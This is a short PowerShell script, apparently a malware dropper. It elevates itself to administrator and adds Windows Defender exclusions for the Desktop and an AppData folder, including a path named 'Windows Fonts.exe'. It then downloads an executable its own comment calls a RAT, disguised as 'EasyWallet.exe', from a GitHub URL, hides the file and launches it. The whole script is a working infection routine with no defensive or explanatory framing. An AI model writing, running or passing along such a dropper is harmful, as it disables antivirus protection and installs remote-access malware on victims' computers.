function Run-AsAdmin {
    param([string]$scriptPath)

    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
        $psi.Verb = "runas"
        try {
            [Diagnostics.Process]::Start($psi) | Out-Null
            exit
        }
        catch {
            Write-Error "Elevation cancelled or failed."
            exit 1
        }
    }
}

# Relaunch as admin if not already
$scriptPath = $MyInvocation.MyCommand.Definition
Run-AsAdmin -scriptPath $scriptPath

# Download RAT
$exeUrl = "https://raw.githubusercontent.com/AeXeno/EasyWallet/main/EasyWallet.exe"

# Paths
$desktopPath = [Environment]::GetFolderPath("Desktop")
$destination = Join-Path -Path $desktopPath -ChildPath "EasyWallet.exe"

$roamingTempPath = Join-Path -Path $env:APPDATA -ChildPath "temp"
$roamingFontExe = Join-Path -Path $roamingTempPath -ChildPath "Windows Fonts.exe"

# Make sure temp folder exists
if (-not (Test-Path $roamingTempPath)) {
    New-Item -ItemType Directory -Force -Path $roamingTempPath | Out-Null
}

# Add exclusions
Add-MpPreference -ExclusionPath $desktopPath
Add-MpPreference -ExclusionPath $destination
Add-MpPreference -ExclusionPath $roamingTempPath
Add-MpPreference -ExclusionPath $roamingFontExe

# Download to desktop
Invoke-WebRequest -Uri $exeUrl -OutFile $destination

# Hide it on desktop
Set-ItemProperty -Path $destination -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

# Launch the exe yhh
Start-Process -FilePath $destination